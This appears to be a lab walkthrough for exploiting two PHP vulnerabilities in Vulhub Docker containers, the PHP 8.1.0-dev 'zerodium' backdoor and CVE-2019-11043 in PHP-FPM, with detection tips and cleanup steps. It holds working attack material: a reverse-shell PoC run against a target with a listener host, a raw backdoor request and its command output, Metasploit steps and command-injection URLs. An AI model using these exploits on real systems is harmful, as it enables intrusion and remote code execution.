# PHP Version Detection and Vulnerabilities

> This guide walks through setting up two PHP-based vulnerable environments using **Vulhub**, which is great for testing and learning exploitation of real-world vulnerabilities.

ðŸ”— HTB Machine : [*Knife â€“ HTB*](https://app.hackthebox.com/machines/Knife?tab=play_machine)

---

## PHP Version Detection

Use the following command to detect the PHP version running on a target server:

```bash
curl -I http://<target-ip>:<port>/
```

### Example

```bash
curl -I http://192.168.1.15:2222 
```

### Output

```http
HTTP/1.1 200 OK
Date: Fri, 06 Feb 2026 18:33:37 GMT
Server: nostromo 1.9.6
Connection: close
Last-Modified: Mon, 01 Aug 2016 15:36:48 GMT
Content-Length: 4577
Content-Type: text/html
```

---

Or use **Nmap** with the `http-php-version` script:

```bash
nmap -p <port> --script=http-php-version.nse <target-ip>
```

### Example

```bash
nmap -v -sT -sV -A -O --script=http-php-version.nse -p 2222 192.168.1.15
```
---

## PHP 8.1.0-dev Backdoor Exploitation (on Debain Machine)

**Reference:**
ðŸ”— Vulhub PHP 8.1.0-dev Backdoor

---

## Docker Installation

Update and install Docker and Docker Compose:

```bash
apt update
```

```bash
apt install docker-compose
```
```
netstat -nltup
```

Install Docker using the official install script: (NOT REQUIRED)

```bash
curl -sSL https://get.docker.com/ | sh
```

Restart Docker service:

```bash
systemctl restart docker
```

Enable Docker to start on boot:

```bash
systemctl enable docker
```

Check Docker status:

```bash
systemctl status docker
```
---

## Clone Vulhub and Build The Vulnerable Container (on Debain Machine)

Clone the Vulhub repository: https://github.com/vulhub/vulhub

```bash
cd /opt
```

```bash
git clone https://github.com/vulhub/vulhub.git
```

Navigate to the PHP 8.1 backdoor directory:

```bash
cd /opt/vulhub/php/8.1-backdoor/
```

Build the Docker containers:

```bash
docker-compose build
```

Run the environment in the background:

```bash
docker-compose up -d
```

---

## Port And Service Checks

Check if Docker or the vulnerable environment is listening on required ports:

```bash
netstat -nltup | grep 5000
```

```bash
netstat -nltup | grep docker
```

---

## Nmap Scanning 

**Basic detection and `versioning` scan:**

```bash
nmap -v -p 8080 -sT -sC -sV -A -O 192.168.1.20
```

**PHP `version detection` using NSE script:**

```bash
nmap -v -p 8080 -sT -sV -A -O --script=http-php-version.nse 192.168.1.20
```
---

## PHP Version detection

using `BurpSuite` and `curl` command:

```bash
curl -I http://<target-ip>:port/
```

```bash
curl -I http://192.168.1.20:8080/
```

```bash
HTTP/1.1 200 OK
Host: 192.168.1.20:8080
Date: Sat, 07 Feb 2026 07:56:26 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```


---

## Exploitation Resources

* **Exploit-DB:**
  [https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)

* **PoC Repository:**
  [https://github.com/flast101/php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

---

## Reverse Shell Exploitation

**Download the reverse shell PoC:**

```bash
wget https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/main/revshell_php_8.1.0-dev.py
```

**View usage options:**

```bash
python revshell_php_8.1.0-dev.py -h
```

**Run the reverse shell attack:**

```bash
python revshell_php_8.1.0-dev.py http://192.168.1.23:8080/ 192.168.1.7 443
```

---

- Malicious Request

```http
GET / HTTP/1.1
Host: 192.168.1.20:8080
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
User-Agentt: zerodiumsystem("uname -a");
Content-Length: 207

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

- Observed Response
```http
HTTP/1.1 200 OK
Host: 192.168.1.20:8080
Date: Sat, 07 Feb 2026 08:16:08 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8

Linux 88b547ec4d06 6.12.63+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.63-1 (2025-12-30) x86_64 GNU/Linux
hello world
```
---

## Analysis

* The backdoored PHP binary interprets any header starting with `User-Agent` (e.g., `User-Agentt`) as executable PHP code if passed through **zerodium**â€™s backdoor patch.
* The payload `zerodiumsystem('uname -a');` executes the `uname -a` command on the server.
* The response shows the raw command output, confirming **remote code execution (RCE)**.

---

## Recommendation For Detection

1. Monitor for unusual HTTP headers like `User-Agentt`, `X-Cmd`, or any unstandard ones.
2. Look for suspicious PHP versions like `PHP/8.1.0-dev` in the `X-Powered-By` response header.
3. Use tools like `tcpdump`, `Wireshark`, or `Suricata` for traffic inspection.

---

## Cleanup

**Stop and remove containers and volumes:**

```bash
docker-compose down -v
```

---

## CVE-2019-11043 â€“ PHP-FPM Remote Code Execution

* This CVE affects PHP-FPM under certain Nginx configurations.
* **Reference:** Vulhub CVE-2019-11043

---

## Environment Setup

**Navigate to the relevant directory:**

```bash
cd /opt/vulhub/php/CVE-2019-11043
```

**Build the containers:**

```bash
docker-compose build
```

## Run the Environment

```bash
docker-compose up -d
```

---

## Check if the Service Is Running on Port `8080`

```bash
netstat -nltup | grep 8080
```

---

## Create `phpinfo.php`

```bash
vim /opt/vulhub/php/CVE-2019-11043/www/phpinfo.php
```

```php
<?php
phpinfo();
?>
```

---
## Exploitation using `Metasploit`

```bash
msfconsole
```

```bash
search php-fpm
```

```bash
use 0
```

```bash
show options
```

```bash
set RHOST 192.168.1.20
```

```bash
set RPORT 8080
```

```bash
exploit
```

```bash
ls
```

---
## Exploitation Tool â€“ Phuip-Fpizdam

### Install Using Go

**Install the tool via Go:**

```bash
go install github.com/neex/phuip-fpizdam@latest
```

**Run the exploit:**

```bash
/root/go/bin/phuip-fpizdam "http://192.168.1.20:8080/index.php"
```

---

## Manual Installation

**Clone the repository:**

```bash
git clone https://github.com/neex/phuip-fpizdam.git
```

**Navigate to the folder:**

```bash
cd phuip-fpizdam/
```

---

## Build the Tool

```bash
go install .
```

---

## Run the Tool

```bash
./phuip-fpizdam "http://192.168.1.23:8080/index.php"
```

---

## Command Injection Example URLs

**Try accessing these URLs in your browser or via `curl`:**

```text
http://192.168.1.220:8080/index.php?a="id"
```

```text
http://192.168.1.23:8080/index.php?a="ls"
```

---

## Notes

* Make sure your local firewall rules allow incoming connections if using a reverse shell.
* Always isolate this lab in a safe, virtualized, or offline environment.
* For improved results with **CVE-2019-11043**, adjust the payload padding if exploitation fails.

